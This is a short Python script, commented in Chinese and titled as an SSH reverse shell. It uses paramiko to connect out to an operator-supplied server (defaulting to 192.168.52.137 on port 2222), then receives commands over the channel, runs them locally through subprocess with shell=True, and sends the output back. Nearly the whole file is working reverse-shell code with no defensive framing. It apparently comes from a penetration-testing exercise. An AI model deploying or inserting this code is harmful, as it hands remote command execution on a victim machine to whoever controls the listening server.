import paramiko
import shlex
import subprocess

"""
ssh的反向shell
"""


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port, user, passwd)

    # get_transport():返回底层传输对象的SSH连接。这可以用来执行低级任务,像打开特定类型的通道
    # Returns:	the Transport for this connection
    # open_session(): Request a new channel to the server,of type "session".
    # Returns:	a new Channel
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        # Send data to the channel. Returns the number of bytes sent
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # 读取命令，在本地执行，然后把结果发回
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return


if __name__ == '__main__':
    import getpass

    user = input("Enter username:")
    passwd = getpass.getpass()
    ip = input("Enter Sercer IP <CR>") or '192.168.52.137'
    port = input("Enter port or <CR>") or 2222
    ssh_command(ip, port, user, passwd, 'ClientConnected')

